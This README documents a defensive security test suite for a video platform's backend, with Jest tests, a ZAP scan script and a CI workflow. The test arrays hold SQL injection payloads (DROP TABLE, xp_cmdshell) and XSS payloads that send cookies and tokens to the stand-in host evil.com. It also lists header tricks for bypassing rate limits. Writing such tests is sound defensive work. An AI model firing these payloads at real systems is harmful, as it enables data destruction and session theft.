# Security Testing Implementation

Comprehensive security testing suite for Al Ummah Now backend services covering OWASP Top 10 and custom security scenarios.

## Overview

This testing suite covers:
- **Authentication Security**: JWT validation, session management, OAuth2 security
- **Authorization Testing**: Role-based access control, permission validation
- **Input Validation**: SQL injection, XSS, CSRF, command injection
- **API Security**: Rate limiting, CORS, security headers, API key management
- **Data Protection**: Encryption, data masking, PII handling
- **Infrastructure Security**: Network security, container security, secrets management
- **Vulnerability Scanning**: Automated security scanning with OWASP ZAP
- **Penetration Testing**: Manual and automated penetration testing

## Security Test Categories

### OWASP Top 10 Coverage

1. **Broken Access Control** - Authorization bypass, privilege escalation
2. **Cryptographic Failures** - Weak encryption, insecure storage
3. **Injection** - SQL injection, NoSQL injection, command injection
4. **Insecure Design** - Business logic flaws, security misconfiguration
5. **Security Misconfiguration** - Default credentials, unnecessary services
6. **Vulnerable Components** - Outdated dependencies, vulnerable libraries
7. **Authentication Failures** - Weak passwords, session fixation
8. **Software/Data Integrity** - Insecure deserialization, code injection
9. **Logging/Monitoring** - Insufficient logging, missing security events
10. **Server-Side Request Forgery (SSRF)** - URL validation, network access

## Test Structure

```
security/
├── README.md                    # This file
├── owasp/                       # OWASP Top 10 tests
│   ├── broken-access-control.test.ts
│   ├── cryptographic-failures.test.ts
│   ├── injection.test.ts
│   ├── insecure-design.test.ts
│   ├── security-misconfig.test.ts
│   ├── vulnerable-components.test.ts
│   ├── authentication-failures.test.ts
│   ├── integrity-failures.test.ts
│   ├── logging-monitoring.test.ts
│   └── ssrf.test.ts
├── authentication/              # Authentication security tests
│   ├── jwt-validation.test.ts
│   ├── session-management.test.ts
│   ├── oauth2-security.test.ts
│   ├── password-policies.test.ts
│   ├── multi-factor-auth.test.ts
│   └── account-lockout.test.ts
├── authorization/               # Authorization tests
│   ├── rbac.test.ts            # Role-based access control
│   ├── permission-validation.test.ts
│   ├── privilege-escalation.test.ts
│   └── resource-access.test.ts
├── input-validation/            # Input validation tests
│   ├── sql-injection.test.ts
│   ├── xss.test.ts             # Cross-site scripting
│   ├── csrf.test.ts            # Cross-site request forgery
│   ├── command-injection.test.ts
│   ├── path-traversal.test.ts
│   └── file-upload.test.ts
├── api-security/               # API security tests
│   ├── rate-limiting.test.ts
│   ├── cors.test.ts           # Cross-origin resource sharing
│   ├── security-headers.test.ts
│   ├── api-key-management.test.ts
│   ├── version-security.test.ts
│   └── documentation-security.test.ts
├── data-protection/            # Data protection tests
│   ├── encryption.test.ts
│   ├── data-masking.test.ts
│   ├── pii-handling.test.ts
│   ├── gdpr-compliance.test.ts
│   └── data-retention.test.ts
├── infrastructure/              # Infrastructure security tests
│   ├── network-security.test.ts
│   ├── container-security.test.ts
│   ├── secrets-management.test.ts
│   ├── cloud-security.test.ts
│   └── monitoring-logging.test.ts
├── vulnerability-scanning/      # Automated vulnerability scanning
│   ├── zap-config.json         # OWASP ZAP configuration
│   ├── zap-scan.js            # ZAP automation script
│   ├── dependency-check.js     # Dependency vulnerability scanning
│   └── container-scan.js       # Container security scanning
├── penetration-testing/         # Penetration testing scripts
│   ├── recon-test.ts          # Reconnaissance testing
│   ├── exploitation-test.ts   # Exploitation testing
│   ├── post-exploitation.test.ts
│   └── report-generation.ts
├── fixtures/                   # Security test data
│   ├── malicious-payloads.json
│   ├── sql-injection-payloads.json
│   ├── xss-payloads.json
│   └── test-credentials.json
├── utils/                      # Security testing utilities
│   ├── auth-helpers.ts        # Authentication test helpers
│   ├── payload-generators.ts  # Malicious payload generators
│   ├── security-scanner.ts    # Security scanning utilities
│   └── report-writer.ts       # Security report generation
└── reports/                    # Security reports
    ├── templates/             # Report templates
    ├── scan-results/          # Scan result files
    └── compliance/            # Compliance reports
```

## Quick Start

### Prerequisites
- Node.js 18+
- OWASP ZAP (for automated scanning)
- pnpm package manager
- Docker (for container security testing)

### Installation

```bash
# Install OWASP ZAP
brew install zaproxy  # macOS
# or
sudo apt-get install zaproxy  # Ubuntu

# Install security testing dependencies
pnpm install

# Setup security testing environment
pnpm run security:setup
```

### Running Security Tests

```bash
# Run all security tests
pnpm test:security

# Run specific OWASP Top 10 tests
pnpm test:owasp

# Run authentication security tests
pnpm test:auth-security

# Run input validation tests
pnpm test:input-validation

# Run automated vulnerability scan
pnpm run security:zap-scan

# Run dependency vulnerability check
pnpm run security:dependency-check

# Run container security scan
pnpm run security:container-scan

# Generate security report
pnpm run security:report
```

## Security Test Implementation

### 1. Authentication Security Tests

```typescript
// authentication/jwt-validation.test.ts
import { describe, it, expect } from '@jest/globals';
import { createTestClient } from '../api/helpers/test-client';
import { SecurityTestUtils } from '../utils/security-scanner';

describe('JWT Validation Security Tests', () => {
  let client: any;
  let securityUtils: SecurityTestUtils;

  beforeEach(() => {
    client = createTestClient();
    securityUtils = new SecurityTestUtils();
  });

  describe('JWT Token Validation', () => {
    it('should reject malformed JWT tokens', async () => {
      const malformedTokens = [
        'invalid.token.here',
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',
        'header.payload', // Missing signature
        'too.many.parts.in.token',
        '', // Empty token
        'Bearer undefined',
        'Bearer null'
      ];

      for (const token of malformedTokens) {
        client.setAuthToken(token);
        
        const response = await client.get('/auth/me');
        expect(response.status).toBe(401);
        
        const data = await response.json();
        expect(data.error).toContain('Invalid token');
      }
    });

    it('should reject expired JWT tokens', async () => {
      const expiredToken = securityUtils.generateExpiredJWT();
      client.setAuthToken(expiredToken);

      const response = await client.get('/auth/me');
      expect(response.status).toBe(401);
      
      const data = await response.json();
      expect(data.error).toContain('expired');
    });

    it('should reject tokens with invalid signature', async () => {
      const tokenWithInvalidSignature = securityUtils.generateJWTWithInvalidSignature();
      client.setAuthToken(tokenWithInvalidSignature);

      const response = await client.get('/auth/me');
      expect(response.status).toBe(401);
    });

    it('should reject tokens with invalid algorithm', async () => {
      const tokenWithNoneAlgorithm = securityUtils.generateJWTWithNoneAlgorithm();
      client.setAuthToken(tokenWithNoneAlgorithm);

      const response = await client.get('/auth/me');
      expect(response.status).toBe(401);
    });

    it('should validate token issuer claim', async () => {
      const tokenWithWrongIssuer = securityUtils.generateJWTWithWrongIssuer();
      client.setAuthToken(tokenWithWrongIssuer);

      const response = await client.get('/auth/me');
      expect(response.status).toBe(401);
    });

    it('should validate token audience claim', async () => {
      const tokenWithWrongAudience = securityUtils.generateJWTWithWrongAudience();
      client.setAuthToken(tokenWithWrongAudience);

      const response = await client.get('/auth/me');
      expect(response.status).toBe(401);
    });
  });

  describe('Session Management', () => {
    it('should invalidate tokens on logout', async () => {
      // Login to get valid token
      await client.authenticate({
        email: 'test@example.com',
        password: 'TestPassword123!'
      });

      // Logout
      const logoutResponse = await client.post('/auth/logout');
      expect(logoutResponse.status).toBe(200);

      // Try to use token after logout
      const response = await client.get('/auth/me');
      expect(response.status).toBe(401);
    });

    it('should prevent session fixation', async () => {
      // Attempt to use existing session after login
      const oldToken = client.authToken;
      
      await client.authenticate({
        email: 'test@example.com',
        password: 'TestPassword123!'
      });

      // Old token should be invalid
      client.setAuthToken(oldToken);
      const response = await client.get('/auth/me');
      expect(response.status).toBe(401);
    });

    it('should implement proper session timeout', async () => {
      // This test would require mocking time or using very short-lived tokens
      const shortLivedToken = securityUtils.generateShortLivedJWT(1); // 1 second
      client.setAuthToken(shortLivedToken);

      // Wait for token to expire
      await new Promise(resolve => setTimeout(resolve, 1100));

      const response = await client.get('/auth/me');
      expect(response.status).toBe(401);
    });
  });
});
```

### 2. Input Validation Tests

```typescript
// input-validation/sql-injection.test.ts
import { describe, it, expect } from '@jest/globals';
import { createTestClient } from '../api/helpers/test-client';
import { SQLInjectionPayloads } from '../fixtures/malicious-payloads.json';

describe('SQL Injection Security Tests', () => {
  let client: any;

  beforeEach(() => {
    client = createTestClient();
  });

  describe('Search Endpoints', () => {
    it('should prevent SQL injection in search queries', async () => {
      const sqlPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users VALUES('hacker','password'); --",
        "' OR 1=1 --",
        "' OR 'a'='a",
        "1' OR '1'='1' /*",
        "x'; DELETE FROM videos WHERE 't'='t",
        "'; EXEC xp_cmdshell('dir'); --",
        "' UNION SELECT @@version --"
      ];

      for (const payload of sqlPayloads) {
        const response = await client.get(`/api/videos/search?q=${encodeURIComponent(payload)}`);
        
        // Should not return server error
        expect(response.status).not.toBe(500);
        
        const data = await response.json();
        
        // Should not return database error messages
        if (data.error) {
          expect(data.error).not.toMatch(/sql|mysql|postgresql|sqlite|database/i);
        }
        
        // Should return empty results or valid search results
        if (data.data) {
          expect(Array.isArray(data.data)).toBe(true);
        }
      }
    });
  });

  describe('Authentication Endpoints', () => {
    it('should prevent SQL injection in login', async () => {
      const sqlPayloads = [
        "' OR '1'='1' --",
        "admin'--",
        "admin' /*",
        "' OR 'x'='x",
        "'; DROP TABLE users; --"
      ];

      for (const payload of sqlPayloads) {
        const response = await client.post('/auth/login', {
          email: payload,
          password: 'password'
        });

        // Should not authenticate successfully
        expect(response.status).toBe(401);
        
        const data = await response.json();
        expect(data.error).not.toMatch(/sql|mysql|postgresql|sqlite|database/i);
      }
    });
  });

  describe('Parameterized Queries', () => {
    it('should use parameterized queries for video IDs', async () => {
      const maliciousIds = [
        "1; DROP TABLE videos; --",
        "1' UNION SELECT * FROM users --",
        "1 OR 1=1",
        "'; EXEC xp_cmdshell('dir'); --"
      ];

      for (const id of maliciousIds) {
        const response = await client.get(`/api/videos/${encodeURIComponent(id)}`);
        
        // Should return 404 for invalid IDs, not 500
        expect([404, 400]).toContain(response.status);
        expect(response.status).not.toBe(500);
      }
    });
  });
});
```

### 3. XSS Prevention Tests

```typescript
// input-validation/xss.test.ts
import { describe, it, expect } from '@jest/globals';
import { createTestClient } from '../api/helpers/test-client';
import { XSSPayloads } from '../fixtures/malicious-payloads.json';

describe('Cross-Site Scripting (XSS) Prevention Tests', () => {
  let client: any;

  beforeEach(() => {
    client = createTestClient();
  });

  describe('Input Sanitization', () => {
    it('should sanitize XSS payloads in video titles', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert(1)',
        '<svg onload="alert(1)">',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '<iframe src="javascript:alert(1)"></iframe>',
        '<body onload="alert(1)">',
        '<input onfocus="alert(1)" autofocus>',
        '<select onfocus="alert(1)" autofocus>'
      ];

      for (const payload of xssPayloads) {
        const response = await client.post('/api/videos', {
          title: payload,
          description: 'Test video description'
        });

        // Should either accept and sanitize or reject
        if (response.status === 201) {
          const data = await response.json();
          
          // Title should be sanitized
          expect(data.title).not.toContain('<script>');
          expect(data.title).not.toContain('javascript:');
          expect(data.title).not.toContain('onerror=');
          expect(data.title).not.toContain('onload=');
        } else {
          // Should reject malicious input
          expect([400, 422]).toContain(response.status);
        }
      }
    });

    it('should sanitize XSS payloads in comments', async () => {
      const xssPayloads = [
        '<script>document.location="http://evil.com"</script>',
        '<img src=x onerror=fetch("http://evil.com/"+document.cookie)>',
        '<svg><script>alert(1)</script></svg>',
        '"><script>fetch("http://evil.com/"+localStorage.token)</script>',
        '<link rel="import" href="http://evil.com/">'
      ];

      for (const payload of xssPayloads) {
        const response = await client.post('/api/comments', {
          videoId: 'test-video-123',
          content: payload
        });

        if (response.status === 201) {
          const data = await response.json();
          
          // Content should be sanitized
          expect(data.content).not.toContain('<script>');
          expect(data.content).not.toContain('javascript:');
          expect(data.content).not.toContain('fetch(');
        } else {
          expect([400, 422]).toContain(response.status);
        }
      }
    });
  });

  describe('Output Encoding', () => {
    it('should properly encode HTML entities in responses', async () => {
      // Create content with HTML entities
      const createResponse = await client.post('/api/videos', {
        title: 'Test <script>alert("XSS")</script> Video',
        description: 'Video with <img src="x" onerror="alert(1)"> content'
      });

      if (createResponse.status === 201) {
        const videoId = createResponse.data.id;
        
        // Retrieve the video
        const getResponse = await client.get(`/api/videos/${videoId}`);
        const data = await getResponse.json();
        
        // Should be properly encoded
        expect(data.title).toContain('&lt;script&gt;');
        expect(data.title).not.toContain('<script>');
        expect(data.description).toContain('&lt;img');
        expect(data.description).not.toContain('<img');
      }
    });
  });

  describe('Content Security Policy', () => {
    it('should include CSP headers', async () => {
      const response = await client.get('/api/videos');
      
      const cspHeader = response.headers.get('Content-Security-Policy');
      expect(cspHeader).toBeTruthy();
      
      // Should restrict script sources
      expect(cspHeader).toContain("script-src");
      expect(cspHeader).toContain("'self'");
    });

    it('should include X-XSS-Protection header', async () => {
      const response = await client.get('/api/videos');
      
      const xssProtection = response.headers.get('X-XSS-Protection');
      expect(xssProtection).toBe('1; mode=block');
    });
  });
});
```

### 4. Rate Limiting Tests

```typescript
// api-security/rate-limiting.test.ts
import { describe, it, expect } from '@jest/globals';
import { createTestClient } from '../api/helpers/test-client';

describe('Rate Limiting Security Tests', () => {
  let client: any;

  beforeEach(() => {
    client = createTestClient();
  });

  describe('API Rate Limiting', () => {
    it('should limit login attempts', async () => {
      const credentials = {
        email: 'test@example.com',
        password: 'wrongpassword'
      };

      // Make multiple rapid login attempts
      const responses = [];
      for (let i = 0; i < 20; i++) {
        const response = await client.post('/auth/login', credentials);
        responses.push(response);
      }

      // Should eventually be rate limited
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
      
      // Check rate limit headers
      const rateLimitedResponse = rateLimitedResponses[0];
      expect(rateLimitedResponse.headers.get('Retry-After')).toBeTruthy();
      expect(rateLimitedResponse.headers.get('X-RateLimit-Limit')).toBeTruthy();
      expect(rateLimitedResponse.headers.get('X-RateLimit-Remaining')).toBeTruthy();
    });

    it('should limit video upload attempts', async () => {
      const responses = [];
      
      // Make multiple upload attempts
      for (let i = 0; i < 15; i++) {
        const response = await client.post('/api/videos', {
          title: `Test Video ${i}`,
          description: 'Test description'
        });
        responses.push(response);
      }

      // Should be rate limited after certain attempts
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should implement different limits for different endpoints', async () => {
      // Test search endpoint (should have higher limit)
      const searchResponses = [];
      for (let i = 0; i < 100; i++) {
        const response = await client.get(`/api/videos/search?q=test${i}`);
        searchResponses.push(response);
      }

      // Test login endpoint (should have lower limit)
      const loginResponses = [];
      for (let i = 0; i < 20; i++) {
        const response = await client.post('/auth/login', {
          email: 'test@example.com',
          password: 'wrongpassword'
        });
        loginResponses.push(response);
      }

      // Login should be rate limited more aggressively
      const loginRateLimited = loginResponses.filter(r => r.status === 429);
      const searchRateLimited = searchResponses.filter(r => r.status === 429);

      expect(loginRateLimited.length).toBeGreaterThan(0);
      // Search might not be rate limited at this volume
    });
  });

  describe('Distributed Rate Limiting', () => {
    it('should handle rate limiting across multiple IPs', async () => {
      // Simulate requests from different IPs
      const ips = ['192.168.1.1', '192.168.1.2', '192.168.1.3'];
      const allResponses = [];

      for (const ip of ips) {
        const ipClient = createTestClient();
        
        for (let i = 0; i < 10; i++) {
          const response = await ipClient.post('/auth/login', {
            email: 'test@example.com',
            password: 'wrongpassword'
          });
          allResponses.push({ ip, response });
        }
      }

      // Each IP should be rate limited independently
      const rateLimitedByIP = new Map();
      
      for (const { ip, response } of allResponses) {
        if (response.status === 429) {
          rateLimitedByIP.set(ip, (rateLimitedByIP.get(ip) || 0) + 1);
        }
      }

      // All IPs should eventually be rate limited
      expect(rateLimitedByIP.size).toBeGreaterThan(0);
    });
  });

  describe('Rate Limiting Bypass Prevention', () => {
    it('should prevent rate limiting bypass via headers', async () => {
      const responses = [];
      
      // Try different header combinations to bypass rate limiting
      const headerVariations = [
        { 'X-Forwarded-For': '1.2.3.4' },
        { 'X-Real-IP': '1.2.3.4' },
        { 'X-Originating-IP': '1.2.3.4' },
        { 'X-Remote-IP': '1.2.3.4' },
        { 'X-Remote-Addr': '1.2.3.4' }
      ];

      for (const headers of headerVariations) {
        for (let i = 0; i < 10; i++) {
          const response = await client.post('/auth/login', {
            email: 'test@example.com',
            password: 'wrongpassword'
          }, headers);
          responses.push(response);
        }
      }

      // Should still be rate limited
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should prevent rate limiting bypass via session rotation', async () => {
      const responses = [];
      
      // Try to bypass by creating new sessions
      for (let i = 0; i < 50; i++) {
        const newClient = createTestClient();
        
        const response = await newClient.post('/auth/login', {
          email: 'test@example.com',
          password: 'wrongpassword'
        });
        responses.push(response);
      }

      // Should still be rate limited based on IP or other identifier
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });
  });
});
```

## Vulnerability Scanning

### OWASP ZAP Automation

```javascript
// vulnerability-scanning/zap-scan.js
const ZapClient = require('zaproxy');

class ZAPSecurityScanner {
  constructor(apiKey, proxyUrl = 'http://127.0.0.1:8080') {
    this.zap = new ZapClient({ proxy: proxyUrl, apiKey });
  }

  async scanApplication(targetUrl, options = {}) {
    console.log(`Starting security scan of: ${targetUrl}`);
    
    try {
      // Start spidering
      const spiderId = await this.startSpider(targetUrl);
      await this.waitForSpider(spiderId);
      
      // Start active scan
      const scanId = await this.startActiveScan(targetUrl);
      await this.waitForActiveScan(scanId);
      
      // Generate report
      const report = await this.generateReport();
      
      return report;
    } catch (error) {
      console.error('Security scan failed:', error);
      throw error;
    }
  }

  async startSpider(targetUrl) {
    console.log('Starting spider...');
    const response = await this.zap.spider.scan(targetUrl);
    return response.scan;
  }

  async waitForSpider(spiderId) {
    console.log('Waiting for spider to complete...');
    
    let progress = 0;
    while (progress < 100) {
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      const status = await this.zap.spider.status(spiderId);
      progress = parseInt(status.status);
      
      console.log(`Spider progress: ${progress}%`);
    }
    
    console.log('Spider completed');
  }

  async startActiveScan(targetUrl) {
    console.log('Starting active scan...');
    const response = await this.zap.ascan.scan(targetUrl);
    return response.scan;
  }

  async waitForActiveScan(scanId) {
    console.log('Waiting for active scan to complete...');
    
    let progress = 0;
    while (progress < 100) {
      await new Promise(resolve => setTimeout(resolve, 5000));
      
      const status = await this.zap.ascan.status(scanId);
      progress = parseInt(status.status);
      
      console.log(`Active scan progress: ${progress}%`);
    }
    
    console.log('Active scan completed');
  }

  async generateReport() {
    console.log('Generating security report...');
    
    // Get alerts
    const alerts = await this.zap.core.alerts();
    
    // Generate HTML report
    const htmlReport = await this.zap.core.htmlreport();
    const markdownReport = await this.zap.core.mdreport();
    
    return {
      alerts: alerts.alerts,
      htmlReport,
      markdownReport,
      summary: this.generateSummary(alerts.alerts)
    };
  }

  generateSummary(alerts) {
    const summary = {
      high: 0,
      medium: 0,
      low: 0,
      informational: 0,
      total: alerts.length
    };

    alerts.forEach(alert => {
      switch (alert.risk) {
        case 'High':
          summary.high++;
          break;
        case 'Medium':
          summary.medium++;
          break;
        case 'Low':
          summary.low++;
          break;
        case 'Informational':
          summary.informational++;
          break;
      }
    });

    return summary;
  }
}

// CLI usage
if (require.main === module) {
  const targetUrl = process.env.TARGET_URL || 'http://127.0.0.1:3086';
  const apiKey = process.env.ZAP_API_KEY;
  
  if (!apiKey) {
    console.error('ZAP_API_KEY environment variable is required');
    process.exit(1);
  }

  const scanner = new ZAPSecurityScanner(apiKey);
  
  scanner.scanApplication(targetUrl)
    .then(report => {
      console.log('Security scan completed');
      console.log('Summary:', report.summary);
      
      // Save reports
      require('fs').writeFileSync('security-report.html', report.htmlReport);
      require('fs').writeFileSync('security-report.md', report.markdownReport);
      
      console.log('Reports saved to security-report.html and security-report.md');
    })
    .catch(error => {
      console.error('Scan failed:', error);
      process.exit(1);
    });
}

module.exports = ZAPSecurityScanner;
```

## Security Configuration

### Security Headers Configuration

```typescript
// utils/security-headers.ts
export const securityHeaders = {
  'Content-Security-Policy': [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline' https://apis.google.com",
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
    "font-src 'self' https://fonts.gstatic.com",
    "img-src 'self' data: https:",
    "connect-src 'self' https://api.alummahnow.net",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'"
  ].join('; '),
  
  'X-Content-Type-Options': 'nosniff',
  'X-Frame-Options': 'DENY',
  'X-XSS-Protection': '1; mode=block',
  'Referrer-Policy': 'strict-origin-when-cross-origin',
  'Permissions-Policy': [
    'camera=()',
    'microphone=()',
    'geolocation=()',
    'payment=()',
    'usb=()',
    'magnetometer=()',
    'gyroscope=()',
    'accelerometer=()'
  ].join(', '),
  
  'Strict-Transport-Security': 'max-age=31536000; includeSubDomains; preload',
  'Access-Control-Allow-Origin': 'https://alummahnow.net',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization',
  'Access-Control-Allow-Credentials': 'true',
  'Access-Control-Max-Age': '86400'
};
```

## CI/CD Integration

### GitHub Actions Security Workflow

```yaml
# .github/workflows/security-tests.yml
name: Security Tests

on:
  pull_request:
    paths:
      - 'apps/**'
  schedule:
    - cron: '0 3 * * *' # Daily at 3 AM UTC
  workflow_dispatch:

jobs:
  security-tests:
    runs-on: ubuntu-latest
    
    services:
      zap:
        image: owasp/zap2docker-stable
        ports:
          - 8080:8080
        options: >-
          --name zap
          -t
          -d
          -config api.addrs.addr.name=.* -config api.addrs.addr.regex=true
          -config api.key=changeme
    
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
          
      - name: Install dependencies
        run: pnpm install
        
      - name: Wait for ZAP to start
        run: |
          timeout 60 bash -c 'until curl -f http://localhost:8080; do sleep 2; done'
          
      - name: Run security tests
        run: |
          cd docs/test-cases/backend/security
          pnpm test:security
        env:
          ZAP_API_KEY: changeme
          TARGET_URL: http://localhost:3086
          
      - name: Run OWASP ZAP scan
        run: |
          cd docs/test-cases/backend/security
          node vulnerability-scanning/zap-scan.js
        env:
          ZAP_API_KEY: changeme
          TARGET_URL: http://localhost:3086
          
      - name: Run dependency vulnerability check
        run: pnpm audit --audit-level moderate
        
      - name: Upload security reports
        uses: actions/upload-artifact@v3
        if: always()
        with:
          name: security-reports
          path: |
            docs/test-cases/backend/security/reports/
            security-report.html
            security-report.md
```

## Security Reporting

### Security Report Template

```typescript
// utils/report-writer.ts
export class SecurityReportWriter {
  generateReport(scanResults: any): string {
    let report = '# Security Assessment Report\n\n';
    report += `**Generated:** ${new Date().toISOString()}\n\n`;
    
    // Executive Summary
    report += '## Executive Summary\n\n';
    report += `- **High Risk Issues:** ${scanResults.summary.high}\n`;
    report += `- **Medium Risk Issues:** ${scanResults.summary.medium}\n`;
    report += `- **Low Risk Issues:** ${scanResults.summary.low}\n`;
    report += `- **Total Issues:** ${scanResults.summary.total}\n\n`;
    
    // Risk Assessment
    report += '## Risk Assessment\n\n';
    const riskLevel = this.calculateRiskLevel(scanResults.summary);
    report += `**Overall Risk Level:** ${riskLevel}\n\n`;
    
    // Detailed Findings
    report += '## Detailed Findings\n\n';
    
    scanResults.alerts.forEach((alert, index) => {
      report += `### ${index + 1}. ${alert.alert}\n\n`;
      report += `**Risk:** ${alert.risk}\n`;
      report += `**Confidence:** ${alert.confidence}\n`;
      report += `**Description:** ${alert.desc}\n`;
      report += `**Solution:** ${alert.solution}\n`;
      report += `**Reference:** ${alert.reference}\n\n`;
      
      if (alert.instances && alert.instances.length > 0) {
        report += '**Affected URLs:**\n';
        alert.instances.forEach(instance => {
          report += `- ${instance.uri}\n`;
        });
        report += '\n';
      }
    });
    
    // Recommendations
    report += '## Recommendations\n\n';
    report += this.generateRecommendations(scanResults.summary);
    
    return report;
  }
  
  private calculateRiskLevel(summary: any): string {
    if (summary.high > 0) return 'HIGH';
    if (summary.medium > 5) return 'HIGH';
    if (summary.medium > 2) return 'MEDIUM';
    if (summary.low > 10) return 'MEDIUM';
    return 'LOW';
  }
  
  private generateRecommendations(summary: any): string {
    let recommendations = '';
    
    if (summary.high > 0) {
      recommendations += '1. **Immediate Action Required:** Address all high-risk vulnerabilities immediately\n';
    }
    
    if (summary.medium > 0) {
      recommendations += '2. **Short-term:** Plan remediation of medium-risk issues within 30 days\n';
    }
    
    if (summary.low > 0) {
      recommendations += '3. **Long-term:** Address low-risk issues in next development cycle\n';
    }
    
    recommendations += '\n4. **Continuous Monitoring:** Implement regular security scanning\n';
    recommendations += '5. **Security Training:** Ensure team is aware of secure coding practices\n';
    
    return recommendations;
  }
}
```

## Best Practices

### Security Testing Guidelines
1. **Test Early**: Integrate security testing in CI/CD pipeline
2. **Test Often**: Run security scans on every PR and daily
3. **Test Everything**: Cover all endpoints and user inputs
4. **Test Realistically**: Simulate real attack scenarios
5. **Test Continuously**: Monitor for new vulnerabilities

### Secure Development
1. **Input Validation**: Validate all inputs on server side
2. **Output Encoding**: Encode all outputs based on context
3. **Authentication**: Use strong authentication mechanisms
4. **Authorization**: Implement principle of least privilege
5. **Encryption**: Encrypt data at rest and in transit

### Incident Response
1. **Detection**: Monitor for security events
2. **Analysis**: Investigate potential security incidents
3. **Containment**: Limit impact of security breaches
4. **Recovery**: Restore systems to normal operation
5. **Learning**: Improve security based on incidents